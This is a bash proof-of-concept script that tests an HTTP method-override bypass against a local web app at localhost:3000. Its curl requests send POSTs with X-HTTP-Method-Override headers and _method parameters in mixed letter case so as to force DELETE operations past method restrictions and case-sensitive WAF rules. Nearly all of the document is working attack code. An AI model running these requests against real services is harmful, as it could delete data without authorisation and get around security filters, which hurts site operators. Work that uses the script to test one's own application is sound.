#!/bin/bash

TARGET="http://localhost:3000/"
DATA="name=Test&surname=User&address=123"

echo "=== Case-Insensitive HTTP Method Override Bypass PoC ==="
echo ""

echo "[*] Direct DELETE (returns 405):"
curl -s -i "$TARGET" -X DELETE 2>&1 | grep "HTTP/1.1"

echo ""
echo "[*] Bypasses via case-insensitive override header values:"

echo "[*] Lowercase: X-HTTP-Method-Override: delete"
curl -s -i "$TARGET" -X POST -H "X-HTTP-Method-Override: delete" -H "Content-Type: application/x-www-form-urlencoded" -d "$DATA" 2>&1 | grep "HTTP/1.1"

echo "[*] Mixed case: X-HTTP-Method-Override: Delete"
curl -s -i "$TARGET" -X POST -H "X-HTTP-Method-Override: Delete" -H "Content-Type: application/x-www-form-urlencoded" -d "$DATA" 2>&1 | grep "HTTP/1.1"

echo "[*] Uppercase: X-HTTP-Method-Override: DELETE"
curl -s -i "$TARGET" -X POST -H "X-HTTP-Method-Override: DELETE" -H "Content-Type: application/x-www-form-urlencoded" -d "$DATA" 2>&1 | grep "HTTP/1.1"

echo ""
echo "[*] Bypasses via case-insensitive override header names:"

echo "[*] Lowercase: x-http-method-override: DELETE"
curl -s -i "$TARGET" -X POST -H "x-http-method-override: DELETE" -H "Content-Type: application/x-www-form-urlencoded" -d "$DATA" 2>&1 | grep "HTTP/1.1"

echo "[*] Uppercase: X-HTTP-METHOD-OVERRIDE: DELETE"
curl -s -i "$TARGET" -X POST -H "X-HTTP-METHOD-OVERRIDE: DELETE" -H "Content-Type: application/x-www-form-urlencoded" -d "$DATA" 2>&1 | grep "HTTP/1.1"

echo ""
echo "[*] Case-insensitive query parameter values:"
echo "[*] Lowercase: ?_method=delete"
curl -s -i "$TARGET?_method=delete" -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "$DATA" 2>&1 | grep "HTTP/1.1"

echo "[*] Uppercase: ?_METHOD=DELETE"
curl -s -i "$TARGET?_METHOD=DELETE" -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "$DATA" 2>&1 | grep "HTTP/1.1"

echo ""
echo "[+] VULNERABILITY: Case variations allow bypassing method restrictions"
echo "[+] WAF rules that filter 'X-HTTP-Method-Override' (case-sensitive) can be bypassed"
